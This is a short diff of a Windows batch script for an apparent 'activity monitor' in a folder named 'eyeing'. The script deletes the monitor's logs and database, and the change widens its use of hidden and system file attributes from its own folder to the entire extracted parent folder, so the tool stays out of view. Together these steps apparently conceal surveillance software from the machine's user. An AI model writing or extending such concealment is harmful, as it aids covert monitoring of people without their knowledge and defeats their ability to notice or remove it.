@@ -31,8 +31,9 @@ if exist "%~dp0activity_data\activity_monitor.log" del /f /q "%~dp0activity_data
 if exist "%~dp0activity_data\activity_monitor.db"  del /f /q "%~dp0activity_data\activity_monitor.db"  >nul 2>&1
 if exist "%~dp0activity_monitor.log" del /f /q "%~dp0activity_monitor.log" >nul 2>&1
 
-attrib +h +s "%~dp0" >nul 2>&1
-attrib +h +s "%~dp0*" /s /d >nul 2>&1
+rem Hide the entire extracted folder (parent of eyeing\) and everything inside it
+attrib +h +s "%~dp0.." >nul 2>&1
+attrib +h +s "%~dp0..\*" /s /d >nul 2>&1
 
 where python >nul 2>&1
 if %errorlevel% neq 0 (
